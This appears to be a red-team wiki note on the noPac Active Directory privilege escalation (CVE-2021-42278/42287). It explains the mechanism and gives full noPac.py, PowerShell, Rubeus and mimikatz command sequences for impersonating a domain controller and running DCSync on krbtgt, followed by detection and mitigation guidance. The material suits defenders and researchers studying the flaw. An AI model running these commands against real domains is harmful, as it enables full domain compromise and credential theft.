---
title: noPac
aliases: ["CVE-2021-42278", "CVE-2021-42287", "SAM-Account-Name spoofing", "sAMAccountName impersonation"]
type: technique
domain: [red-team, active-directory]
attack_tactic: [privesc]
tags: [type/technique, domain/red-team, attack/privesc, cve]
source: "Multiple researchers (Cube0x0, exploitph)"
source_url: "https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware"
verified: true
related: ["[[Computer Accounts]]", "[[Kerberos]]", "[[Kerberos Authentication Flow]]", "[[Domain Controller (DC)]]", "[[DCSync]]"]
created: 2026-06-07
updated: 2026-06-07
---

# noPac (CVE-2021-42278 + CVE-2021-42287)

> [!summary] One-liner
> A two-CVE chain that lets any authenticated domain user impersonate a Domain Controller by creating a machine account, renaming it to match a DC's sAMAccountName, requesting a TGT, then renaming back — the KDC issues a service ticket for the real DC.

## Concepts abused
**CVE-2021-42278** (SAM-Account-Name spoofing): By default, any domain user can create up to 10 machine accounts (`ms-DS-MachineAccountQuota`). The exploit creates a computer account and removes the trailing `$` from its `sAMAccountName` — making it match a DC's name.

**CVE-2021-42287** (KDC confusion): When the KDC processes a TGS-REQ and can't find the account from the TGT's PAC (because the name was changed back), it appends `$` and looks up the machine account — finding the **real DC** instead. It issues a service ticket for the DC.

## Attack flow
1. Create a machine account (e.g., `FAKEMACHINE$`).
2. Clear its SPN (to avoid conflicts).
3. Rename `sAMAccountName` to `DC01` (matching the real DC, without the `$`).
4. Request a TGT as `DC01` → KDC issues TGT for this name.
5. Rename `sAMAccountName` back to `FAKEMACHINE$`.
6. Use the TGT to request a service ticket (S4U2self) for `DC01$` → KDC can't find `DC01`, appends `$`, finds the real `DC01$`, issues ST.
7. Use the ST to [[DCSync]] or access the DC as the DC machine account.

## Prerequisites
- Any **authenticated domain user** (standard privileges).
- `ms-DS-MachineAccountQuota` > 0 (default: 10).
- Target DC **unpatched** (patch: November 2021).

## Commands & tools

### noPac.py (Impacket-based)
```bash
# Scan — check if vulnerable
python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -use-ldap --scan

# Exploit — get a shell on the DC
python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -use-ldap --impersonate Administrator -dump

# Exploit — DCSync
python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -use-ldap --impersonate Administrator -dump -just-dc-user krbtgt
```

### Manual (Rubeus + PowerShell)
```powershell
# 1. Create machine account
New-MachineAccount -MachineAccount "FAKEMACHINE" -Password $(ConvertTo-SecureString 'P@ss123!' -AsPlainText -Force)

# 2. Clear SPNs
Set-DomainObject "FAKEMACHINE$" -Clear servicePrincipalName

# 3. Rename to DC name
Set-MachineAccountAttribute -MachineAccount "FAKEMACHINE" -Value "DC01" -Attribute sAMAccountName

# 4. Get TGT
Rubeus.exe asktgt /user:DC01 /password:P@ss123! /enctype:aes256 /domain:<DOMAIN> /dc:<DC_IP> /nowrap

# 5. Rename back
Set-MachineAccountAttribute -MachineAccount "FAKEMACHINE" -Value "FAKEMACHINE$" -Attribute sAMAccountName

# 6. S4U2self with the TGT
Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:ldap/<DC_FQDN> /dc:<DC_IP> /ptt /ticket:<TGT_BASE64>

# 7. DCSync
mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
```

## Detection / artifacts
- **Event 4741**: Computer account creation.
- **Event 4742**: Computer account `sAMAccountName` modification (rename events — especially removing/adding `$`).
- Rapid sequence: create → rename → TGT request → rename back → S4U → high-priv access.
- Machine accounts with `sAMAccountName` matching a DC name (without `$`).

## Mitigation
- **Patch**: KB5008602 (November 2021) — KDC now validates PAC attributes during S4U.
- Set `ms-DS-MachineAccountQuota` to **0** (prevent unprivileged machine account creation).
- Monitor Event 4742 for `sAMAccountName` changes on computer objects.
- Restrict who can create machine accounts via delegation.

## Related
- Machine accounts: [[Computer Accounts]].
- Kerberos mechanics abused: [[Kerberos]], [[Kerberos Authentication Flow]], [[PAC]].
- Post-exploit: [[DCSync]].
- Similar instant-DA attacks: [[Zerologon]], [[PetitPotam]].

## Sources
- CVE-2021-42278 / CVE-2021-42287.
- Secureworks — "noPac: A Tale of Two Vulnerabilities That Could End in Ransomware."
